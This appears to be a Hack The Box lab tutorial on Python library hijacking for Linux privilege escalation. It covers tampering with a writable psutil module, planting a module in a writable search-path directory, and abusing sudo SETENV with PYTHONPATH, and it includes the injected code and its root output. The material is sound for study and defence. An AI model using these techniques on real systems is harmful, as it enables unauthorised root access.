#### Importing Modules

```python
#!/usr/bin/env python3

# Method 1 - Module Import
import pandas

# Method 2 - Wildcard Import
from pandas import *

# Method 3 - Name Import
from pandas import Series
```

However, there are three basic attack vectors where hijacking can be used:

1. `Insecure Write Permissions`
2. `Python Library Search Path`
3. `PYTHONPATH Environment Variable`
## Insecure Write Permissions
#### Checking Sudo Privileges

```shell
htb-student@lpenix:~$ sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```
#### Python Script - Permissions

```shell
htb-student@lpenix:~$ ls -l mem_status.py 

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```
#### Python Script - Contents

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```
#### Module Permissions

```shell
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```
#### Module Contents

```python
...SNIP...

def virtual_memory():

    ...SNIP...
    
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```
#### Module Contents - Hijacking

```python
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```
#### Privilege Escalation

```shell
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```
## Python Library Search Path
#### PYTHONPATH Listing

```shell
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```
#### Psutil Default Installation Location

```shell
htb-student@lpenix:~$ pip3 show psutil 

...SNIP... 
Location: /usr/local/lib/python3.8/dist-packages 

...SNIP...
```
#### Misconfigured Directory Permissions

```shell
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```
#### Hijacked Module Contents - psutil.py

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```
#### Privilege Escalation via Library Search Path Hijacking

```shell
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```
## PYTHONPATH Environment Variable
#### Checking Sudo Privileges

```shell
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```
#### Privilege Escalation via PYTHONPATH Environment Variable Hijacking

```shell
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```